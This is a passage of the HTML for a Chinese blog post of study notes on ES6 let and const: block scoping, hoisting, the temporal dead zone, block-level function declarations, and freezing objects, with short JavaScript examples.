<!doctype html>



  


<html class="theme-next mist use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="ES6," />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta name="description" content="letlet 用来声明的对象只在let命令所在的代码块内有效例如1234&amp;#123;    let s=5;&amp;#125;console.log(s);
此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。">
<meta property="og:type" content="article">
<meta property="og:title" content="ES6学习笔记一（let 和 const 命令）">
<meta property="og:url" content="http://www.wanzhuhao.cn/2017/02/17/ES6学习笔记一（let-和-const-命令）/index.html">
<meta property="og:site_name" content="EXCALIBUR">
<meta property="og:description" content="letlet 用来声明的对象只在let命令所在的代码块内有效例如1234&amp;#123;    let s=5;&amp;#125;console.log(s);
此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。">
<meta property="og:image" content="http://s6.51cto.com/wyfs02/M02/45/CA/wKioL1PrNzric2sCAAAIbSjfxMk032.png">
<meta property="og:image" content="http://s2.51cto.com/wyfs02/M02/45/C9/wKiom1PrNpaxQcj6AADAFq-wGrI971.png">
<meta property="og:updated_time" content="2017-02-16T16:04:24.535Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ES6学习笔记一（let 和 const 命令）">
<meta name="twitter:description" content="letlet 用来声明的对象只在let命令所在的代码块内有效例如1234&amp;#123;    let s=5;&amp;#125;console.log(s);
此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。">
<meta name="twitter:image" content="http://s6.51cto.com/wyfs02/M02/45/CA/wKioL1PrNzric2sCAAAIbSjfxMk032.png">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>




  <link rel="canonical" href="http://www.wanzhuhao.cn/2017/02/17/ES6学习笔记一（let-和-const-命令）/"/>

  <title> ES6学习笔记一（let 和 const 命令） | EXCALIBUR </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?6b76e9bfbd7a965d2ad9ed314a9ebe1e";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">EXCALIBUR</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">In Arthurian legend, the sword belonging to King Arthur.</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="st-search-show-outputs">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <form class="site-search-form">
  <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
</form>

<script type="text/javascript">
  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');

  _st('install', 'QvwLzan7Uz5xPEAmtKy5','2.0.0');
</script>



    </div>
  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                ES6学习笔记一（let 和 const 命令）
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2017-02-17T00:01:00+08:00" content="2017-02-17">
              2017-02-17
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/javascript/" itemprop="url" rel="index">
                    <span itemprop="name">javascript</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2017/02/17/ES6学习笔记一（let-和-const-命令）/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/17/ES6学习笔记一（let-和-const-命令）/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><h5 id="let-用来声明的对象只在let命令所在的代码块内有效"><a href="#let-用来声明的对象只在let命令所在的代码块内有效" class="headerlink" title="let 用来声明的对象只在let命令所在的代码块内有效"></a>let 用来声明的对象只在let命令所在的代码块内有效</h5><h5 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    let s=5;</div><div class="line">&#125;</div><div class="line">console.log(s);</div></pre></td></tr></table></figure>
<h6 id="此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。"><a href="#此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。" class="headerlink" title="此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。"></a>此时代码会报错，因为在代码块应用s变量，这会导致娶不到该变量，该属性非常适合在for循环内使用，另外，for循环还有一个特别之处，就是循环语句部分是一个父作用域，而循环体内部是一个单独的子作用域。</h6><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">for (let i = 0; i &lt; 3; i++) &#123;</div><div class="line">  let i = &apos;abc&apos;;</div><div class="line">  console.log(i);</div><div class="line">&#125;</div><div class="line">// abc</div><div class="line">// abc</div><div class="line">// abc</div></pre></td></tr></table></figure>
<h6 id="上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。"><a href="#上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。" class="headerlink" title="上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。"></a>上面代码输出了3次abc，这表明函数内部的变量i和外部的变量i是分离的。</h6><h5 id="let用来声明的对象不存在变量提升的情况，例如"><a href="#let用来声明的对象不存在变量提升的情况，例如" class="headerlink" title="let用来声明的对象不存在变量提升的情况，例如"></a>let用来声明的对象不存在变量提升的情况，例如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">console.log(bar); // 报错ReferenceError</div><div class="line">let bar = 2;</div></pre></td></tr></table></figure>
<h6 id="此时代码会报错，因此使用let时必须先声明后调用"><a href="#此时代码会报错，因此使用let时必须先声明后调用" class="headerlink" title="此时代码会报错，因此使用let时必须先声明后调用"></a>此时代码会报错，因此使用let时必须先声明后调用</h6><h5 id="只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响"><a href="#只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响" class="headerlink" title="只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响"></a>只要块级作用于存在let变量，那么此变量将会绑定改作用域，当前作用于不再受外界同名的变量影响</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var tmp = 123;</div><div class="line"></div><div class="line">if (true) &#123;</div><div class="line">  tmp = &apos;abc&apos;; // ReferenceError</div><div class="line">  let tmp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="相同作用域内，不允许重复声明变量"><a href="#相同作用域内，不允许重复声明变量" class="headerlink" title="相同作用域内，不允许重复声明变量"></a>相同作用域内，不允许重复声明变量</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// 报错</div><div class="line">function () &#123;</div><div class="line">  let a = 10;</div><div class="line">  let a = 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="此处高能开始，块级作用域与函数声明"><a href="#此处高能开始，块级作用域与函数声明" class="headerlink" title="此处高能开始，块级作用域与函数声明"></a>此处高能开始，块级作用域与函数声明</h4><h6 id="ES5-规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6-引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。"><a href="#ES5-规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6-引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。" class="headerlink" title="ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。"></a>ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数。ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function f() &#123; console.log(&apos;I am outside!&apos;); &#125;</div><div class="line">(function () &#123;</div><div class="line">  if (false) &#123;</div><div class="line">    // 重复声明一次函数f</div><div class="line">    function f() &#123; console.log(&apos;I am inside!&apos;); &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  f();</div><div class="line">&#125;());</div></pre></td></tr></table></figure>
<h6 id="上面代码在-ES5-中运行，会得到“I-am-inside-”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成"><a href="#上面代码在-ES5-中运行，会得到“I-am-inside-”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成" class="headerlink" title="上面代码在 ES5 中运行，会得到“I am inside!”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成"></a>上面代码在 ES5 中运行，会得到“I am inside!”，因为在if内声明的函数f会被提升到函数头部。可以将其想象成</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">function f() &#123; console.log(&apos;I am outside!&apos;); &#125;</div><div class="line">function f() &#123; console.log(&apos;I am inside!&apos;); &#125;</div><div class="line">f();</div><div class="line">//I am inside!</div></pre></td></tr></table></figure>
<h6 id="ES6-的运行结果就完全不一样了，会得到“I-am-outside-”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。"><a href="#ES6-的运行结果就完全不一样了，会得到“I-am-outside-”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。" class="headerlink" title="ES6 的运行结果就完全不一样了，会得到“I am outside!”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。"></a>ES6 的运行结果就完全不一样了，会得到“I am outside!”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响，实际运行的代码如下。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">function f() &#123; console.log(&apos;I am outside!&apos;); &#125;</div><div class="line">(function () &#123;</div><div class="line">  f();</div><div class="line">&#125;());</div></pre></td></tr></table></figure>
<h6 id="但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？"><a href="#但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？" class="headerlink" title="但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？"></a>但是，如果你真的在ES6浏览器中运行一下上面的代码，是会报错的，这是为什么呢？</h6><h6 id="原来，ES6-改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。"><a href="#原来，ES6-改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。" class="headerlink" title="原来，ES6 改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。"></a>原来，ES6 改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6在附录B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。</h6><ul>
<li>允许在块级作用域内声明函数。</li>
<li>函数声明类似于var，即会提升到全局作用域或函数作用域的头部。</li>
<li>同时，函数声明还会提升到所在的块级作用域的头部。</li>
</ul>
<h6 id="注意，上面三条规则只对-ES6-的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。"><a href="#注意，上面三条规则只对-ES6-的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。" class="headerlink" title="注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。"></a>注意，上面三条规则只对 ES6 的浏览器实现有效，其他环境的实现不用遵守，还是将块级作用域的函数声明当作let处理。</h6><h6 id="根据这三条规则，在浏览器的-ES6-环境中，块级作用域内声明的函数，行为类似于var声明的变量。"><a href="#根据这三条规则，在浏览器的-ES6-环境中，块级作用域内声明的函数，行为类似于var声明的变量。" class="headerlink" title="根据这三条规则，在浏览器的 ES6 环境中，块级作用域内声明的函数，行为类似于var声明的变量。"></a>根据这三条规则，在浏览器的 ES6 环境中，块级作用域内声明的函数，行为类似于var声明的变量。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function f() &#123; console.log(&apos;I am outside!&apos;); &#125;</div><div class="line">(function () &#123;</div><div class="line">  if (false) &#123;</div><div class="line">    // 重复声明一次函数f</div><div class="line">    function f() &#123; console.log(&apos;I am inside!&apos;); &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  f();</div><div class="line">&#125;());</div></pre></td></tr></table></figure>
<h6 id="实际的运行结果类似这样"><a href="#实际的运行结果类似这样" class="headerlink" title="实际的运行结果类似这样"></a>实际的运行结果类似这样</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function f() &#123; console.log(&apos;I am outside!&apos;); &#125;</div><div class="line">(function () &#123;</div><div class="line">  var f = undefined;</div><div class="line">  if (false) &#123;</div><div class="line">    function f() &#123; console.log(&apos;I am inside!&apos;); &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  f();</div><div class="line">&#125;());</div></pre></td></tr></table></figure>
<h6 id="考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。"><a href="#考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。" class="headerlink" title="考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。"></a>考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。</h6><h2 id="do表达式"><a href="#do表达式" class="headerlink" title="do表达式"></a>do表达式</h2><h5 id="本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。"><a href="#本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。" class="headerlink" title="本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。"></a>本质上，块级作用域是一个语句，将多个操作封装在一起，没有返回值。现在有一个提案，使得块级作用域可以变为表达式，也就是说可以返回值，办法就是在块级作用域之前加上do，使它变为do表达式。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">let x = do &#123;</div><div class="line">  let t = f();</div><div class="line">  t * t + 1;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h5 id="经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用"><a href="#经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用" class="headerlink" title="==经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用=="></a>==经过试验，这个do表达式即使babel也无法将其转义，因此，请避免使用==</h5><h2 id="const命令"><a href="#const命令" class="headerlink" title="const命令"></a>const命令</h2><h5 id="const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。"><a href="#const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。" class="headerlink" title="const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。"></a>const声明一个只读的常量。一旦声明，常量的值就不能改变。其特性和let非常相似，不可能重复声明，不存在变量提升，拥有暂时性死区，只在声明所在的块级作用域内有效。同时const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。</h5><p>==对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。const命令只是保证变量名指向的地址不变，并不保证该地址的数据不变，所以将一个对象声明为常量必须非常小心。==</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">const foo = &#123;&#125;;</div><div class="line">foo.prop = 123;</div><div class="line"></div><div class="line">foo.prop</div><div class="line">// 123</div><div class="line"></div><div class="line">foo = &#123;&#125;; // TypeError: &quot;foo&quot; is read-only</div></pre></td></tr></table></figure>
<h6 id="上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。"><a href="#上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。" class="headerlink" title="上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。"></a>上面代码中，常量foo储存的是一个地址，这个地址指向一个对象。不可变的只是这个地址，即不能把foo指向另一个地址，但对象本身是可变的，所以依然可以为其添加新属性。</h6><p>==如果真的想将对象冻结，应该使用Object.freeze方法。==</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">const foo = Object.freeze(&#123;&#125;);</div><div class="line"></div><div class="line">// 常规模式时，下面一行不起作用；</div><div class="line">// 严格模式时，该行会报错</div><div class="line">foo.prop = 123;</div></pre></td></tr></table></figure>
<h6 id="如果想要将对象彻底冻结，则需要将其属性全部冻结。"><a href="#如果想要将对象彻底冻结，则需要将其属性全部冻结。" class="headerlink" title="如果想要将对象彻底冻结，则需要将其属性全部冻结。"></a>如果想要将对象彻底冻结，则需要将其属性全部冻结。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">const foo = Object.freeze(&#123;a:&#123;s:1&#125;,b:3&#125;)</div><div class="line"></div><div class="line">foo.a.s=3;</div><div class="line"></div><div class="line">//此时赋值仍然有效</div></pre></td></tr></table></figure>
<h6 id="下面是一个完全冻结对象的函数"><a href="#下面是一个完全冻结对象的函数" class="headerlink" title="下面是一个完全冻结对象的函数"></a>下面是一个完全冻结对象的函数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var constantize = (obj) =&gt; &#123;</div><div class="line">  Object.freeze(obj);</div><div class="line">  Object.keys(obj).forEach( (key, value) =&gt; &#123;</div><div class="line">    if ( typeof obj[key] === &apos;object&apos; ) &#123;</div><div class="line">      constantize( obj[key] );</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">//通过递归的方式遍历所有的属性并且将其全部冻结</div></pre></td></tr></table></figure>
<h5 id="顶层对象的属性"><a href="#顶层对象的属性" class="headerlink" title="顶层对象的属性"></a>顶层对象的属性</h5><h6 id="顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。"><a href="#顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。" class="headerlink" title="顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。"></a>顶层对象，在浏览器环境指的是window对象，在Node指的是global对象。ES5之中，顶层对象的属性与全局变量是等价的。</h6><h6 id="顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。"><a href="#顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。" class="headerlink" title="顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。"></a>顶层对象的属性与全局变量挂钩，被认为是JavaScript语言最大的设计败笔之一。这样的设计带来了几个很大的问题，首先是没法在编译时就报出变量未声明的错误，只有运行时才能知道（因为全局变量可能是顶层对象的属性创造的，而属性的创造是动态的）；其次，程序员很容易不知不觉地就创建了全局变量（比如打字出错）；最后，顶层对象的属性是到处可以读写的，这非常不利于模块化编程。另一方面，window对象有实体含义，指的是浏览器的窗口对象，顶层对象是一个有实体含义的对象，也是不合适的。</h6><h6 id="ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。"><a href="#ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。" class="headerlink" title="ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。"></a>ES6为了改变这一点，一方面规定，为了保持兼容性，var命令和function命令声明的全局变量，依旧是顶层对象的属性；另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性。也就是说，从ES6开始，全局变量将逐步与顶层对象的属性脱钩。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var a = 1;</div><div class="line">// 如果在Node的REPL环境，可以写成global.a</div><div class="line">// 